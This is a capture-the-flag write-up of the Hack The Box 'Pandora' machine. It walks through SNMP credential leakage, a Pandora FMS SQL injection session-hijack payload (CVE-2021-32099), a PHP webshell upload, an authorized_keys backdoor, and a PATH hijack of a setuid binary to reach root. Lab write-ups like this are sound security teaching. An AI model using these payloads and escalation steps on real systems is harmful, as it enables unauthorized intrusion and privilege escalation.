+++
title = "Hack The Box - Pandora"
tags = [
    "ctf"
]
date = "2022-04-04"
toc = true
+++

# Premise

Second verse same as the first - we're given an IP and no further information. Commence enumeration!

# Enumeration

To set the stage, enumeration is probably the hardest part of this challenge. The rest is doable with some patience and research.

Out of the gate we have a website talking about some random product. There's nothing interactable, and `nmap` only gives us TCP 22 and 80 as open ports.

Fuzzing with `ffuf` and `nikto` turns up nothing actionable, just `icons` and `asset` directories, neither of which can be used for anything.

This is where I got stuck a bit initially, trying to fingerprint the web server further, find alternate hostnames for name-based virtual hosts, etc...but there's nothing, at least out of the gate.

From here, I decided to run a rather painstaking UDP scan with `nmap`, which turned up UDP 161:

```
Discovered open port 161/udp on 10.10.11.136 
```

This wound up being SNMP v1, so we can try running `snmpwalk` against it. Not being overly familiar with this tool, I just took the default examples and ran against it to experiment- `snmpwalk -oS -c public -v 1 panda.htb`. Among other information, if you watch long enough (I mentioned patience...) this will pop up with:

```
iso.3.6.1.2.1.25.4.2.1.5.843 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23
```
These credentials couldn't possibly work over SSH, could they? They do.

Unfortunately, our flag is not in the home dir of the user in question, but is unreadable in `/home/matt/`. On to other enumeration!

# Foothold, but no real traction

At this point we're on the box, we've got reliable access over `ssh`, but we can't really do anything as the `daniel` user has little to no permissions. 

We know we've got an Apache server running, so let's see what else is running. Maybe there's another site that we couldn't enumerate earlier. As it turns out, there is another directory under `/var/www` - `pandoraconsole` but we can't hit it remotely. Looking at `/etc/apache/sites-enabled/pandora.conf` we can see that it's  _only_ listens on `localhost` which is part of the reason we couldn't fuzz for it - and that it runs as `matt`, the user who has our first flag.

# Opening a Pandora's Box

Since this will only respond on `localhost`, we'll need to proxy access. There are a few ways to do this, but SSH port forwarding is probably the easiest by far:

```
ssh -L 80:localhost:80 panda.htb
```

Yep! We have a console. Maybe the same creds? Maybe, but says user can only use the API. Main site links us to docs that cover the API, but long story short there's no direct compromise available there - this is a deep rabbit hole.

What we do know at this point is that we've got another possible attack surace - Pandora FMS v7.0NG.742_FIX_PERL2020, and some quick research turns up a few vulnerabilities - https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained.

Following up with https://github.com/ibnuuby/CVE-2021-32099, we can run the example request and all of a sudden we have an active session as an admin.

```
http://localhost:80/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario%7Cs:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271
```

At this point we've got admin level access to this product, which must be an avenue for further compromise, but there's nothing immiediately obvious.

# Can we put things in the box?

As it turns out, the one thing we _can_ do in this product is perform arbitrary file uploads.

While the paths for these get hashed in so far as how they're returned in the file upload API, poking around the UI we can see some overlap between the images used to populate parts of the UI, logos, etc... and the contents of the directories that we're able to upload to. This means we've likely got a predictable path for where our uploaded files will land.

While this doesn't let us do anything fun like SVG vulnerabilities, it does let us do something even more silly... upload a [PHP webshell](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985). 

Were our theories about predictable paths correct? Yep! http://localhost/pandora_console/images/webshell.php - and it looks like we're running as `matt`. Let's get the user flag!

```
cat /home/matt/user.txt
b7989...
```
 
# Getting root

Let's try to get a shell as `matt` by copying our public key into `authorized_keys` through the webshell.

```
echo <key> >> /home/matt/.ssh/authorized_keys
```
```
➜  ssh matt@panda.htb                                   
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon  4 Apr 16:38:43 UTC 2022

  System load:  0.02              Processes:             234
  Usage of /:   63.2% of 4.87GB   Users logged in:       1
  Memory usage: 9%                IPv4 address for eth0: 10.10.11.136
  Swap usage:   0%

  => /boot is using 91.8% of 219MB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

matt@pandora:~$ 

```

We are in!

The current run of the mill stuff like polkit vulnerabilities appear to have been patched, so no luck there, and we don't have any `sudo` privs. Nothing obvious gained here other than the user flag.

At this point I decided to take a step back and run [pspy](https://github.com/DominicBreuker/pspy) for a few hours to see if anything interesting came up. While this gave me a few leads, there was nothing that was jumping out at me or lead to anything other than rabbit holes.

After letting `pspy` again run for a bit longer in the background and getting nowhere I decided to check for something simple - we we have any `setuid` flagged scripts/binaries that we could abuse?

```
matt@pandora:/dev/shm$ find / -perm -4000 2>/dev/null
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/pandora_backup
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/at
/usr/bin/fusermount
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
```

`pandora_backup` looks like a plant... what is it and can we use it?

```
matt@pandora:/dev/shm$ ll /usr/bin/pandora_backup 
-rwsr-x--- 1 root matt 16816 Dec  3 15:58 /usr/bin/pandora_backup*
```

It's either a plant, or its our target. I'm guessing the later. It's a binary though, so let's see what's in it... hopefully there are some plain text strings:


```
PandoraFMS Backup Utility^@^@^@^@^@^@^@Now attempting to backup PandoraFMS client^@^@^@^@^@^@tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*^@Backup failed!
```

Ok, we can run with this... so it's trying to create a tar file, and it's not specifying the path to the executable. Can we abuse this with a `PATH` update?

```
tar: Removing leading `/' from hard link targets
/var/www/pandora/pandora_console/COPYING
/var/www/pandora/pandora_console/DB_Dockerfile
```

It's definitely running `tar`. Let's update PATH with a malicious `tar` executable that's going to spawn a shell. Since this process runs as `root`, we should be able to get a `root` shell, right?

```
matt@pandora:/dev/shm$ echo "/bin/bash" > tar
matt@pandora:/dev/shm$ chmod +x tar 
matt@pandora:/dev/shm$ PATH=/dev/shm:$PATH
matt@pandora:/dev/shm$ echo $PATH
/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

Running `tar` as `matt` now gives us a new shell (as `matt`). Does this carry over into `pandora_backup`?

YES!

```
matt@pandora:/dev/shm$ /usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
root@pandora:/dev/shm# whoami
root
root@pandora:/dev/shm# cat /root/root.txt 
18dd17ce1...
```

Time to clean up and get out! GG!


